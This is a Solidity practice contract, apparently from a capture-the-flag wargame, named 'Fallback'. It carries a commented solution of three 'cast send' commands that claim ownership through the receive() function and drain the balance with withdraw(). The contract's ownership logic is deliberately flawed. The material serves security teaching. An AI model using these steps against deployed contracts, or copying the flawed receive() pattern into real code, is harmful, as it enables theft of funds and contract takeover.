// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



//SOLUTION
//cast send <0x.. FALLBACK CONTRACT> "contribute()" --value 0.0001ether --rpc-url $RPC --private-key $KEY       // this contributes so we get some balance and are eligible to trigger receive() later
//cast send <0x.. FALLBACK CONTRACT> --value 2wei --rpc-url $RPC --private-key $KEY                             // this makes us the owner
//cast send <0x.. FALLBACK CONTRACT> "withdraw()" --rpc-url $RPC --private-key $KEY                             // we drain the contract balance to zero and win

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}